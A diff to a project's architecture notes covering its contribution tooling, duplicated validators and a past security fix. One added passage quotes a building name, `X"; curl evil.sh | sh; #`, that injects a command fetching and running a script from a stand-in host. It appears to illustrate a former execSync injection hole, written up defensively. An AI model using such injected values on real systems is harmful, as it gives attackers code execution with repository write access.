@@ -71,17 +71,24 @@ The core takes values and returns values. `buildGraph(paths, site)` receives
 paths as an argument rather than reading a closure, which is the entire
 difference between "testable" and "not".
 
-The same shape appears in the contribution pipeline, for the same reason:
+The same shape exists in the contribution tooling, though only half of it is on
+the live path today:
 
 ```
 .github/scripts/contribution-parser.js    pure    parse, validate, derive
-.github/scripts/process-contribution.js   shell   read env, write files, emit outputs
+.github/process-contribution.js           shell   the script contribute.yml runs
 ```
 
-`contribution-parser.js` is the module that decides whether untrusted input is
-safe. Making it pure means the security rules can be exercised directly, with
-no runner and no GitHub. Every vulnerability listed below has a test in
-`tests/contribution-parser.test.js` that names it.
+`contribution-parser.js` is pure, so the rules that decide whether untrusted
+input is safe can be exercised directly, with no runner and no GitHub. It backs
+`validate-data.js` in CI and has a regression test naming each vulnerability it
+pins.
+
+**It does not currently back the contribution pipeline.** `contribute.yml` runs
+`.github/process-contribution.js`, which does its own parsing and validation.
+That is a real duplication: two definitions of "what a valid building looks
+like" that can drift, and the copy guarding untrusted input is the one that
+must not. Unifying them is the obvious next step — see "Known tensions".
 
 **Why not go further?** `app.js` is still ~1,870 lines. The remaining code is
 genuinely UI: it holds a Leaflet map instance, layer groups, and a pile of
@@ -216,6 +223,20 @@ silently stops loading. The failure looks like "the map didn't appear". It is
 documented in CONTRIBUTING, which is weaker than a check.
 
 **`app.js` is still large.** See above.
+
+**Two validators.** `.github/process-contribution.js` validates contributions;
+`contribution-parser.js` validates committed data in CI. They agree today
+because both were checked against the same 264 real entries, but nothing
+enforces that. The pipeline should delegate to the parser so there is one
+definition of a valid entry and one place to test it.
+
+**`run()` must never take a string.** `.github/process-contribution.js` shells
+out to `git` and `gh`. It passes arguments as an array to `spawnSync` with
+`shell: false`, deliberately. An earlier version concatenated them into one
+string for `execSync`, which meant a building named
+`X"; curl evil.sh | sh; #` executed as code with `contents: write` and a live
+token — reachable by any GitHub user opening an issue. The array form is the
+only thing standing between contributor text and a shell.
 
 **Data format.** One JSON array per category means two concurrent
 contributions to the same category conflict. One file per building, keyed by id,
